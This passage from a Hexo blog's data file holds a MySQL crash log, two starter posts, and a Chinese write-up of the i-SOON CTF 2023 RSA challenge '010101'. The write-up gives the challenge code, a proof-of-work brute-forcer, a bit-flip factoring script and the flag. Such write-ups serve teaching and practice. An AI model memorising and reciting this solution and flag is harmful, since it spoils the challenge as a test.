instructions</span><br><span class=\"line\">2023-12-19 12:19:44 1 [Note] InnoDB: Initializing buffer pool, size = 128.0M</span><br><span class=\"line\">2023-12-19 12:19:44 1 [Note] InnoDB: Completed initialization of buffer pool</span><br><span class=\"line\">2023-12-19 12:19:44 1 [Note] InnoDB: Highest supported file format is Barracuda.</span><br><span class=\"line\">2023-12-19 12:19:44 1 [Note] InnoDB: 128 rollback segment(s) are active.</span><br><span class=\"line\">2023-12-19 12:19:44 1 [Note] InnoDB: Waiting <span class=\"keyword\">for</span> purge to start</span><br><span class=\"line\">2023-12-19 12:19:44 1 [Note] InnoDB: 5.6.35 started; <span class=\"built_in\">log</span> sequence number 1625997</span><br><span class=\"line\">2023-12-19 12:19:44 1 [Note] Server hostname (bind-address): <span class=\"string\">&#x27;*&#x27;</span>; port: 3306</span><br><span class=\"line\">2023-12-19 12:19:44 1 [Note] IPv6 is available.</span><br><span class=\"line\">2023-12-19 12:19:44 1 [Note]   - <span class=\"string\">&#x27;::&#x27;</span> resolves to <span class=\"string\">&#x27;::&#x27;</span>;</span><br><span class=\"line\">2023-12-19 12:19:44 1 [Note] Server socket created on IP: <span class=\"string\">&#x27;::&#x27;</span>.</span><br><span class=\"line\">2023-12-19 12:19:44 1 [Warning] <span class=\"string\">&#x27;proxies_priv&#x27;</span> entry <span class=\"string\">&#x27;@ root@100bfe039d09&#x27;</span> ignored <span class=\"keyword\">in</span> --skip-name-resolve mode.</span><br><span class=\"line\">2023-12-19 12:19:44 1 [Note] Event Scheduler: Loaded 0 events</span><br><span class=\"line\">2023-12-19 12:19:44 1 [Note] mysqld: ready <span class=\"keyword\">for</span> connections.</span><br><span class=\"line\">Version: <span class=\"string\">&#x27;5.6.35&#x27;</span>  socket: <span class=\"string\">&#x27;/var/run/mysqld/mysqld.sock&#x27;</span>  port: 3306  MySQL Community Server (GPL)</span><br><span class=\"line\">12:21:29 UTC - mysqld got signal 11 ;</span><br><span class=\"line\">This could be because you hit a bug. It is also possible that this binary</span><br><span class=\"line\">or one of the libraries it was linked against is corrupt, improperly built,</span><br><span class=\"line\">or misconfigured. This error can also be caused by malfunctioning hardware.</span><br><span class=\"line\">We will try our best to scrape up some info that will hopefully <span class=\"built_in\">help</span></span><br><span class=\"line\">diagnose the problem, but since we have already crashed, </span><br><span class=\"line\">something is definitely wrong and this may fail.</span><br><span class=\"line\"></span><br><span class=\"line\">key_buffer_size=8388608</span><br><span class=\"line\">read_buffer_size=131072</span><br><span class=\"line\">max_used_connections=1</span><br><span class=\"line\">max_threads=151</span><br><span class=\"line\">thread_count=1</span><br><span class=\"line\">connection_count=1</span><br><span class=\"line\">It is possible that mysqld could use up to </span><br><span class=\"line\">key_buffer_size + (read_buffer_size + sort_buffer_size)*max_threads = 68108 K  bytes of memory</span><br><span class=\"line\">Hope that<span class=\"string\">&#x27;s ok; if not, decrease some variables in the equation.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">Thread pointer: 0x23d86c0</span></span><br><span class=\"line\"><span class=\"string\">Attempting backtrace. You can use the following information to find out</span></span><br><span class=\"line\"><span class=\"string\">where mysqld died. If you see no messages after this, something went</span></span><br><span class=\"line\"><span class=\"string\">terribly wrong...</span></span><br><span class=\"line\"><span class=\"string\">stack_bottom = 7f3ca45a1e98 thread_stack 0x40000</span></span><br><span class=\"line\"><span class=\"string\">mysqld(my_print_stacktrace+0x2c)[0x8c3d5c]</span></span><br><span class=\"line\"><span class=\"string\">mysqld(handle_fatal_signal+0x481)[0x661df1]</span></span><br><span class=\"line\"><span class=\"string\">/lib/x86_64-linux-gnu/libpthread.so.0(+0xf890)[0x7f3ccee40890]</span></span><br><span class=\"line\"><span class=\"string\">/lib/x86_64-linux-gnu/libc.so.6(memchr+0x78)[0x7f3ccd885cd8]</span></span><br><span class=\"line\"><span class=\"string\">mysqld[0x672dc4]</span></span><br><span class=\"line\"><span class=\"string\">mysqld[0x683e2d]</span></span><br><span class=\"line\"><span class=\"string\">mysqld[0x68433e]</span></span><br><span class=\"line\"><span class=\"string\">mysqld[0x6730a9]</span></span><br><span class=\"line\"><span class=\"string\">mysqld[0x6724df]</span></span><br><span class=\"line\"><span class=\"string\">mysqld(_Z16acl_authenticateP3THDj+0x1bd)[0x68450d]</span></span><br><span class=\"line\"><span class=\"string\">mysqld[0x6abe17]</span></span><br><span class=\"line\"><span class=\"string\">mysqld(_Z16login_connectionP3THD+0x42)[0x6acbe2]</span></span><br><span class=\"line\"><span class=\"string\">mysqld(_Z22thd_prepare_connectionP3THD+0x19)[0x6ad329]</span></span><br><span class=\"line\"><span class=\"string\">mysqld(_Z24do_handle_one_connectionP3THD+0x11c)[0x6ad49c]</span></span><br><span class=\"line\"><span class=\"string\">mysqld(handle_one_connection+0x40)[0x6ad570]</span></span><br><span class=\"line\"><span class=\"string\">mysqld(pfs_spawn_thread+0x146)[0x8fa106]</span></span><br><span class=\"line\"><span class=\"string\">/lib/x86_64-linux-gnu/libpthread.so.0(+0x8064)[0x7f3ccee39064]</span></span><br><span class=\"line\"><span class=\"string\">/lib/x86_64-linux-gnu/libc.so.6(clone+0x6d)[0x7f3ccd8e962d]</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">Trying to get some variables.</span></span><br><span class=\"line\"><span class=\"string\">Some pointers may be invalid and cause the dump to abort.</span></span><br><span class=\"line\"><span class=\"string\">Query (0): Connection ID (thread ID): 1</span></span><br><span class=\"line\"><span class=\"string\">Status: NOT_KILLED</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">The manual page at http://dev.mysql.com/doc/mysql/en/crashing.html contains</span></span><br><span class=\"line\"><span class=\"string\">information that should help you find out what is causing the crash.</span></span><br></pre></td></tr></table></figure>"},{"title":"Hello World","_content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n","source":"_posts/hello-world.md","raw":"---\ntitle: Hello World\n---\nWelcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n","slug":"hello-world","published":1,"date":"2024-01-03T03:45:21.180Z","updated":"1985-10-26T08:15:00.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clrkqvviu0008foi8gl8s82xl","content":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n"},{"title":"my-first-blog","date":"2024-01-03T05:01:45.000Z","_content":"\n\n## My First Blog\n\n这是我的第一篇博客，记录一下使用hexo+githubpages搭建个人网站时有用的参考链接~ b(￣▽￣)d\n\n\n## 参考链接：\n\n- [【基础篇】hexo博客搭建教程 - huanhao - 博客园](https://www.cnblogs.com/huanhao/p/hexobase.html)\n- [Hexo-Next 主题博客个性化配置超详细，超全面(两万字)_hexo next 记录访问了ip-CSDN博客](https://blog.csdn.net/as480133937/article/details/100138838)\n- [hexo开启tags或categories其它菜单时，无法访问问题 | Yanting Ou](https://oytoyt.github.io/2018/12/06/hexo%E5%BC%80%E5%90%AFtags%E6%88%96categories%E5%85%B6%E5%AE%83%E8%8F%9C%E5%8D%95%E6%97%B6%EF%BC%8C%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE%E9%97%AE%E9%A2%98/)\n\n\n## TODO：\n\n- hexo博文中添加图片，修改hexo-asset-image插件配置","source":"_posts/my-first-blog.md","raw":"---\ntitle: my-first-blog\ndate: 2024-01-03 13:01:45\ntags:\n---\n\n\n## My First Blog\n\n这是我的第一篇博客，记录一下使用hexo+githubpages搭建个人网站时有用的参考链接~ b(￣▽￣)d\n\n\n## 参考链接：\n\n- [【基础篇】hexo博客搭建教程 - huanhao - 博客园](https://www.cnblogs.com/huanhao/p/hexobase.html)\n- [Hexo-Next 主题博客个性化配置超详细，超全面(两万字)_hexo next 记录访问了ip-CSDN博客](https://blog.csdn.net/as480133937/article/details/100138838)\n- [hexo开启tags或categories其它菜单时，无法访问问题 | Yanting Ou](https://oytoyt.github.io/2018/12/06/hexo%E5%BC%80%E5%90%AFtags%E6%88%96categories%E5%85%B6%E5%AE%83%E8%8F%9C%E5%8D%95%E6%97%B6%EF%BC%8C%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE%E9%97%AE%E9%A2%98/)\n\n\n## TODO：\n\n- hexo博文中添加图片，修改hexo-asset-image插件配置","slug":"my-first-blog","published":1,"updated":"2024-01-08T14:09:33.053Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clrkqvviv0009foi82ody1uy3","content":"<h2 id=\"My-First-Blog\"><a href=\"#My-First-Blog\" class=\"headerlink\" title=\"My First Blog\"></a>My First Blog</h2><p>这是我的第一篇博客，记录一下使用hexo+githubpages搭建个人网站时有用的参考链接~ b(￣▽￣)d</p>\n<h2 id=\"参考链接：\"><a href=\"#参考链接：\" class=\"headerlink\" title=\"参考链接：\"></a>参考链接：</h2><ul>\n<li><a href=\"https://www.cnblogs.com/huanhao/p/hexobase.html\">【基础篇】hexo博客搭建教程 - huanhao - 博客园</a></li>\n<li><a href=\"https://blog.csdn.net/as480133937/article/details/100138838\">Hexo-Next 主题博客个性化配置超详细，超全面(两万字)_hexo next 记录访问了ip-CSDN博客</a></li>\n<li><a href=\"https://oytoyt.github.io/2018/12/06/hexo%E5%BC%80%E5%90%AFtags%E6%88%96categories%E5%85%B6%E5%AE%83%E8%8F%9C%E5%8D%95%E6%97%B6%EF%BC%8C%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE%E9%97%AE%E9%A2%98/\">hexo开启tags或categories其它菜单时，无法访问问题 | Yanting Ou</a></li>\n</ul>\n<h2 id=\"TODO：\"><a href=\"#TODO：\" class=\"headerlink\" title=\"TODO：\"></a>TODO：</h2><ul>\n<li>hexo博文中添加图片，修改hexo-asset-image插件配置</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"My-First-Blog\"><a href=\"#My-First-Blog\" class=\"headerlink\" title=\"My First Blog\"></a>My First Blog</h2><p>这是我的第一篇博客，记录一下使用hexo+githubpages搭建个人网站时有用的参考链接~ b(￣▽￣)d</p>\n<h2 id=\"参考链接：\"><a href=\"#参考链接：\" class=\"headerlink\" title=\"参考链接：\"></a>参考链接：</h2><ul>\n<li><a href=\"https://www.cnblogs.com/huanhao/p/hexobase.html\">【基础篇】hexo博客搭建教程 - huanhao - 博客园</a></li>\n<li><a href=\"https://blog.csdn.net/as480133937/article/details/100138838\">Hexo-Next 主题博客个性化配置超详细，超全面(两万字)_hexo next 记录访问了ip-CSDN博客</a></li>\n<li><a href=\"https://oytoyt.github.io/2018/12/06/hexo%E5%BC%80%E5%90%AFtags%E6%88%96categories%E5%85%B6%E5%AE%83%E8%8F%9C%E5%8D%95%E6%97%B6%EF%BC%8C%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE%E9%97%AE%E9%A2%98/\">hexo开启tags或categories其它菜单时，无法访问问题 | Yanting Ou</a></li>\n</ul>\n<h2 id=\"TODO：\"><a href=\"#TODO：\" class=\"headerlink\" title=\"TODO：\"></a>TODO：</h2><ul>\n<li>hexo博文中添加图片，修改hexo-asset-image插件配置</li>\n</ul>\n"},{"title":"WriteUp-第六届安洵杯网络安全挑战赛-010101","date":"2024-01-07T06:19:30.000Z","_content":"\n## 赛事名称\n\ni-SOON_CTF_2023   \n第六届安洵杯网络安全挑战赛   \n\n## 赛事描述\n\n[https://dce.i-soon.net/#/examineDetails](https://dce.i-soon.net/#/examineDetails)\n\n## 赛事网址\n\n[https://dce.i-soon.net/#/examineDetails](https://dce.i-soon.net/#/examineDetails)\n\n##  010101\n\n### 题目\n\n```python\n# -*- coding:utf-8 -*-\nimport os\nimport random\nimport string\nimport hashlib\nimport socketserver\nfrom Crypto.Util.number import isPrime, long_to_bytes, getStrongPrime, bytes_to_long\n\nflag = b\"D0g3{******************************************}\"\n\nclass MyServer(socketserver.BaseRequestHandler):\n    def proof(self):\n        random.seed(os.urandom(8))\n        random_str = ''.join([random.choice(string.ascii_letters + string.digits) for _ in range(20)])\n        str_sha256 = hashlib.sha256(random_str.encode()).hexdigest()\n        self.request.sendall(('SHA256(XXXX + %s):%s\\n' % (random_str[4:], str_sha256)).encode())\n        self.request.sendall('Give Me XXXX:\\n'.encode())\n        XXXX = self.request.recv(2048).strip()\n\n        if hashlib.sha256((XXXX + random_str[4:].encode())).hexdigest() != str_sha256:\n            return False\n\n        return True\n\n    def getPQN(self):\n        while True:\n            p = getStrongPrime(2048)\n            q = getStrongPrime(2048)\n            n = p * q\n            if p.bit_length() == 2048 and q.bit_length() == 2048 and n.bit_length() == 4096:\n                return p, q, n\n\n    def encrypt(self):\n        p, q, n = self.getPQN()\n        m = bytes_to_long(flag)\n        e = 0x10001\n        c = pow(m, e, n)\n        p = bin(p)[2:]\n        p1 = list(p[:1024])\n        p2 = list(p[1024:])\n        p1[random.choice([i for i, c in enumerate(p1) if c == '1'])] = '0'\n        p2[random.choice([i for i, c in enumerate(p1) if c == '0'])] = '1'\n        return n, ''.join(p1) + ''.join(p2), c\n\n    def handle(self):\n        if not self.proof():\n            self.request.sendall(b'Error Hash!')\n            return\n        n, p, c = self.encrypt()\n        self.request.sendall('Press 1 to get ciphertext\\n'.encode())\n        number = self.request.recv(512).strip().decode()\n        if number == '1':\n            self.request.sendall((str(n) + '\\n').encode())\n            self.request.sendall((str(p) + '\\n').encode())\n            self.request.sendall((str(c) + '\\n').encode())\n        else:\n            self.request.sendall('Incorrect input!\\n'.encode())\n        return\n\n\nclass ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):\n    pass\n\nif __name__ == '__main__':\n    sever = socketserver.ThreadingTCPServer(('0.0.0.0', 10001), MyServer)\n    ThreadedTCPServer.allow_reuse_address = True\n    ThreadedTCPServer.allow_reuse_port = True\n    sever.serve_forever()\n```\n\n### 考点\n\n- `crypto`\n- `SHA256`\n- `RSA`\n\n### WriteUp\n\n- 分析代码逻辑：\n  - `proof`：\n    - 随机生成一个字符串`random_str`\n    - 计算字符串的哈希值`str_sha256`\n    - 给出`random_str[4:]`和`str_sha256`，让用户计算`random_str[:4]`\n    - 如果用户给定的`random_str[:4]`和`random_str[4:]`的哈希值相同，则验证通过\n  - `getPQN`：\n    - 随机生成两个大素数`p`和`q`，满足以下要求：`p.bit_length() == 2048 and q.bit_length() == 2048 and (p*q).bit_length() == 4096`\n    - `return p, q, n`\n  - `encrypt`：\n    - 通过`getPQN`生成`p`和`q`和`n`\n    - 计算密文`c = pow(m, e, n)`\n    - 对`p`进行变换：前1024位随机挑选一个1变成0，后1024位随机挑选一位变成1，得到`fake_p`\n    - `return n, fake_p, c`\n  - `handle`：   \n    - 通过`proof`函数判断用户输入的`XXXX`和`random_str[4:]`的哈希值是否相同         \n    - 相同的话，通过`encrypt`函数对`flag`进行加密，返回`n, fake_p, c`  \n- 解题步骤：\n  - `nc`连入服务器，获取`random_str[4:]`和`str_sha256`\n    ![](nc连接回显.png)\n  - 通过`getXXXX.py`爆破`random_str[:4]`，并将结果发送给服务器，获得`n，fake_p，c`\n    ```python\n    import hashlib\n    import itertools\n    from string import digits, ascii_letters, punctuation\n    alpha_bet=digits+ascii_letters+punctuation\n    strlist = itertools.product(alpha_bet, repeat=4)\n\n    sha256=\"5ccd4cda1dc33d20a072cddf2cf921c865b274da912edb7ac3f157404c3fe4e3\"\n    tail=\"uLBLoFfDko5h5uA9\"\n\n    xxxx=''\n\n    for i in strlist:\n        data=i[0]+i[1]+i[2]+i[3]\n        data_sha=hashlib.sha256((data+str(tail)).encode()).hexdigest()\n        if(data_sha==str(sha256)):\n            xxxx=data\n            break\n\n    print(xxxx)\n    ```\n  - 基于`encrypt`函数，编写[`decrypt.py`](./files/decrypt.py)脚本，破解`p`，解密得到`flag`\n    ```python\n    # -*- coding:utf-8 -*-\n    import os\n    import random\n    import string\n    import hashlib\n    import socketserver\n    from Crypto.Util.number import long_to_bytes\n\n\n    n=909467367699122020071016988650306999295228108976638769699035391871165765547800730173871546690865275123375066230171521311068819816852640125745292539541259006023609504769135551654529045891894185101263480691408339167146959806826342796151867522273018753414683125578415962666829770904166690498846087399777025030862122796483743577214854248422262763202974262015130017066825754008160259189414818697567284326444565265735329976239935592453543076795651573576794776003238789860869381589213987112412732442793109900427324085928201408085720252507826509949584097216821241278182597257299885172782505117521436358744947983811939554943145617958259867137670519879871430621545154465019553001205911580515698810275961361004704605451591223643427530911392689056988136336912424730785373902092658701108834786609423741166892942322112744091173801215997979197781791157780385712374075574951133435122784372704793303399699730638707098947178219189508884581830248871075957102690166621382729933821529281361101591281902812061185346676660877303782149165897420682724683205662866974137418732285231256810541807361468193401184858075051706155601176563558866315093106261534227649361408522136583934234512184301782185760219449297423394506961283209453334215176208906015567865682661\n    fake_p='11100000100010111111010011100000110011001000001001111011001010011100001101000000001010000010101000011110000001000000010111000110101000101101011101111010001110110000000001101110100011101001100011101010110011111001001011101000110100011011101011110110001111100110101000010110110001001110001101111111100001101101110010011110100101110001101101101011011100111110101111000111000010011101001000011110000101111000010110000001100001111001011100011001110110110110000110000110111010111101110111100100111101111001100110010000000110011011111011111100000010010111111000010110010000110000111100011001111010101000111110011110001010101010010100001010100110111111101010010000000100101011001011100100111111001000111011111010101011111111010011101110111111110011101111001000011011000000000011100101101000001101110101100001110000110101011001000010110110000110110001101010110001100010110010110000000001110001101111011100011011110101010010011010100011010100010101100000010111100000101100010110000100001001101001001001111011011000101010001011010001100101110111111100111111001011100001100001011101011000000001101111011011001001100100111101100100111100100000000111110100011100011110001101100000100000101001101100010100000110111010001111011010110100101010101100000000001111001111010100011000010010010001010011100111100001101100111100010101111101011001100011111011000011101111110101110010100011000111010100000000111110111001111110100011100100111101001101011010110001100000101010001111000110100110101110001011100010011100111110111111010001110111000001000010111110100000110110110010111101101111010010110100011110110011011010010000000000101110101001001111100110111111001000000101101011111011110110111111001101001111011100110101101010101100000010100111101110110101101010100110011010011101101000010011101011001011110001011110011000101110000100000110100011101001100101110000001110100111010110110000101000011011010011100101101011010010010100110011011100001110001000000111101111000001010110111111010110101111000100111111111111101111001110101101111111101111011011101111111000100000110111'\n    c=694500789519839583373480124753870609796624184368847740052659890684952282469412685843793893336588959688292535565388961237054382061607809034620598317779687541764120119851622500197513641485700221545824097256986828990721130988465432457926804939623885349284941907683524562179105951076405178191916974212394857571647273209891325684133975190612454243345915122493599006273649156588911638621279271660577286076492174133379924878816759449537816258877983535822071467357826352013991371273144147958254806851665648862909470014188217381547444474766611515043375595448634817257201321537710925281810846187991415244304258902323932755496219900194257710795367213151869032406828586461628113793387618900293473170817978068346842472541499877290335671510770413540109295368927586613167172537907784632075379648806105818669008103026164730513033786875076959900405998112656279798642754984874654321483935047414576483030634418889375971016788408747123075626184286939742532706576269950026208168650867226593584227608482405783125152467929531339747039920420671850985997912834217484356948372454631601487864570640693252550030654681522447089126289751692094672022733644147229926742656125552935762042624836326359406490008032106080800094693108856102201450516929541344003829402493\n    e = 0x10001\n\n\n    fake_p1=list(fake_p[:1024])\n    fake_p2=list(fake_p[1024:])\n    p=0\n    q=0\n    for i, x in enumerate(fake_p1):\n        if x == '0':\n            p1=fake_p1[:i]+['1']+fake_p1[i+1:]\n            p2=fake_p2\n            p=int(''.join(p1)+''.join(p2),2)   \n            if n%p==0:\n                q=n//p\n                if p.bit_length() == 2048 and q.bit_length() == 2048 and n.bit_length() == 4096:\n                    print(\"Get p q!\\n\")\n                    break\n                else:\n                    print(\"bad format1!\")\n            else:         \n                for j,y in enumerate(fake_p2):\n                    if y== '1':\n                        p2=fake_p2[:j]+['0']+fake_p2[j+1:]\n                        p=int(''.join(p1)+''.join(p2),2)   \n                        if n%p==0:\n                            q=n//p\n                            if p.bit_length() == 2048 and q.bit_length() == 2048 and n.bit_length() == 4096:\n                                print(\"Get p q!\\n\")\n                                break\n                            else:\n                                print(\"bad format2!\")\n    print(p)\n    print(q)\n    phi_n = (p - 1) * (q - 1)\n    print(\"phi_n:\")\n    print(phi_n)\n    d = pow(e, -1, phi_n)\n    m = pow(c, d, n)\n    print(long_to_bytes(m))\n    ```\n\n### FLAG\n\n```plain\nD0g3{sYuWzkFk12A1gcWxG9pymFcjJL7CqN4Cq8PAIACObJ}\n```\n","source":"_posts/WriteUp-第六届安洵杯网络安全挑战赛-010101.md","raw":"---\ntitle: WriteUp-第六届安洵杯网络安全挑战赛-010101\ndate: 2024-01-07 14:19:30\ncategories: \n    - CTF-WriteUp\ntags: \n    - Crypto\n---\n\n## 赛事名称\n\ni-SOON_CTF_2023   \n第六届安洵杯网络安全挑战赛   \n\n## 赛事描述\n\n[https://dce.i-soon.net/#/examineDetails](https://dce.i-soon.net/#/examineDetails)\n\n## 赛事网址\n\n[https://dce.i-soon.net/#/examineDetails](https://dce.i-soon.net/#/examineDetails)\n\n##  010101\n\n### 题目\n\n```python\n# -*- coding:utf-8 -*-\nimport os\nimport random\nimport string\nimport hashlib\nimport socketserver\nfrom Crypto.Util.number import isPrime, long_to_bytes, getStrongPrime, bytes_to_long\n\nflag = b\"D0g3{******************************************}\"\n\nclass MyServer(socketserver.BaseRequestHandler):\n    def proof(self):\n        random.seed(os.urandom(8))\n        random_str = ''.join([random.choice(string.ascii_letters + string.digits) for _ in range(20)])\n        str_sha256 = hashlib.sha256(random_str.encode()).hexdigest()\n        self.request.sendall(('SHA256(XXXX + %s):%s\\n' % (random_str[4:], str_sha256)).encode())\n        self.request.sendall('Give Me XXXX:\\n'.encode())\n        XXXX = self.request.recv(2048).strip()\n\n        if hashlib.sha256((XXXX + random_str[4:].encode())).hexdigest() != str_sha256:\n            return False\n\n        return True\n\n    def getPQN(self):\n        while True:\n            p = getStrongPrime(2048)\n            q = getStrongPrime(2048)\n            n = p * q\n            if p.bit_length() == 2048 and q.bit_length() == 2048 and n.bit_length() == 4096:\n                return p, q, n\n\n    def encrypt(self):\n        p, q, n = self.getPQN()\n        m = bytes_to_long(flag)\n        e = 0x10001\n        c = pow(m, e, n)\n        p = bin(p)[2:]\n        p1 = list(p[:1024])\n        p2 = list(p[1024:])\n        p1[random.choice([i for i, c in enumerate(p1) if c == '1'])] = '0'\n        p2[random.choice([i for i, c in enumerate(p1) if c == '0'])] = '1'\n        return n, ''.join(p1) + ''.join(p2), c\n\n    def handle(self):\n        if not self.proof():\n            self.request.sendall(b'Error Hash!')\n            return\n        n, p, c = self.encrypt()\n        self.request.sendall('Press 1 to get ciphertext\\n'.encode())\n        number = self.request.recv(512).strip().decode()\n        if number == '1':\n            self.request.sendall((str(n) + '\\n').encode())\n            self.request.sendall((str(p) + '\\n').encode())\n            self.request.sendall((str(c) + '\\n').encode())\n        else:\n            self.request.sendall('Incorrect input!\\n'.encode())\n        return\n\n\nclass ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):\n    pass\n\nif __name__ == '__main__':\n    sever = socketserver.ThreadingTCPServer(('0.0.0.0', 10001), MyServer)\n    ThreadedTCPServer.allow_reuse_address = True\n    ThreadedTCPServer.allow_reuse_port = True\n    sever.serve_forever()\n```\n\n### 考点\n\n- `crypto`\n- `SHA256`\n- `RSA`\n\n### WriteUp\n\n- 分析代码逻辑：\n  - `proof`：\n    - 随机生成一个字符串`random_str`\n    - 计算字符串的哈希值`str_sha256`\n    - 给出`random_str[4:]`和`str_sha256`，让用户计算`random_str[:4]`\n    - 如果用户给定的`random_str[:4]`和`random_str[4:]`的哈希值相同，则验证通过\n  - `getPQN`：\n    - 随机生成两个大素数`p`和`q`，满足以下要求：`p.bit_length() == 2048 and q.bit_length() == 2048 and (p*q).bit_length() == 4096`\n    - `return p, q, n`\n  - `encrypt`：\n    - 通过`getPQN`生成`p`和`q`和`n`\n    - 计算密文`c = pow(m, e, n)`\n    - 对`p`进行变换：前1024位随机挑选一个1变成0，后1024位随机挑选一位变成1，得到`fake_p`\n    - `return n, fake_p, c`\n  - `handle`：   \n    - 通过`proof`函数判断用户输入的`XXXX`和`random_str[4:]`的哈希值是否相同         \n    - 相同的话，通过`encrypt`函数对`flag`进行加密，返回`n, fake_p, c`  \n- 